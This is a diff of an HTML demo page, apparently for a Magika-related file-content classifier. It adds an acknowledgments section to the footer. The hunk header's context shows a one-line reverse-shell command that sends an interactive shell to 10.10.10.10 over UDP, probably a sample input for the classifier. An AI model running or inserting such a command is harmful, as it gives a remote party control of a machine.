@@ -128,7 +128,20 @@ sh -i >& /dev/udp/10.10.10.10/9001 0>&1
   </main>
 
   <footer class="footer">
-    Client-side demo only. No text leaves your browser.
+    <p class="footer-privacy">Client-side demo only. No text leaves your browser.</p>
+    <section class="footer-acknowledgments" aria-labelledby="acknowledgments-title">
+      <h2 id="acknowledgments-title">Acknowledgments</h2>
+      <p>
+        This work was carried out with extensive technical feedback from and many informative discussions with
+        Dr. Yanick Fratantonio and Dr. Luca Invernizzi from Google Security Research (authors of
+        <a href="https://github.com/google/magika" target="_blank" rel="noopener">Magika</a>), who also provided
+        generous access to Google Cloud compute resources. Gemini models were used to create and refine the dense
+        segment annotations and to act as the active-learning oracle. Thanks also go to Univ.-Prof. Stefan Rass
+        (JKU Secure Systems Group) for his guidance, especially regarding parsing and classical computer-science
+        approaches. I am especially grateful for his detailed feedback on the accompanying master's thesis and for
+        him supporting this academic collaboration.
+      </p>
+    </section>
   </footer>
 
   <div id="runtimeOverlay" class="runtime-overlay" data-state="loading" role="status" aria-live="polite" aria-hidden="true">
